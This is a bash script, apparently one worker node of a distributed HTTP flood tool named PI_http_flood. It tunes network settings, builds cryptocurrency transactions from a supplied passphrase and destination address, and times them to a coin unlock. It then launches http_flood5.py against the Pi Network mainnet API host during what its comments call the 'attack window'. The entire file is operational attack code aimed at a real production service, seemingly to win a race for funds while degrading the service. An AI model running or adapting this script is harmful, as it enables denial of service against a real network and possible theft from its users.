#!/bin/bash
# Location: ~/PI_http_flood/slave.sh
# Usage: ./slave.sh [base_passphrase] [dest_address] [amount] [unlock_time]

cd /home/ubuntu/PI_http_flood
source flood_env/bin/activate

echo "Received arguments:"
echo "Arg 1 (phrase): '$1'"
echo "Arg 2 (dest): '$2'"
echo "Arg 3 (amount): '$3'"
echo "Arg 4 (time): '$4'"
echo "Total args: $#"


# Parse arguments
BASE_PASSPHRASE="$1"
DEST_ADDRESS="$2"
AMOUNT="$3"
UNLOCK_TIME="$4"  # Format: "YYYY-MM-DD HH:MM:SS"

# Convert unlock time to epoch
UNLOCK_EPOCH=$(date -d "$UNLOCK_TIME" +%s)
CURRENT_EPOCH=$(date +%s)
DELAY_SECONDS=$((UNLOCK_EPOCH - CURRENT_EPOCH - 50))



echo "Raw unlock time received: '$UNLOCK_TIME'"
echo "Converted to epoch: $UNLOCK_EPOCH"
echo "Human readable unlock: $(date -d @$UNLOCK_EPOCH)"
echo "Current epoch: $CURRENT_EPOCH"
echo "Human readable current: $(date -d @$CURRENT_EPOCH)"
echo "Difference in seconds: $((UNLOCK_EPOCH - CURRENT_EPOCH))"
echo "Difference in minutes: $(((UNLOCK_EPOCH - CURRENT_EPOCH) / 60))"

echo "Configuring network parameters..."
sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535" >/dev/null
sudo sysctl -w net.ipv4.tcp_fin_timeout=30 >/dev/null



# Generate transactions
python3 gen_tx1.py \
    --base-passphrase "$BASE_PASSPHRASE" \
    --dest-address "$DEST_ADDRESS" \
    --amount "$AMOUNT" \
    --unlock-time "$UNLOCK_EPOCH"

# Calculate remaining time until attack window
#if [ $DELAY_SECONDS -gt 0 ]; then
#    echo "Waiting for attack window ($DELAY_SECONDS seconds)..."
#    sleep $DELAY_SECONDS
#fi


python3 http_flood5.py api.mainnet.minepi.com 443 10 $DELAY_SECONDS
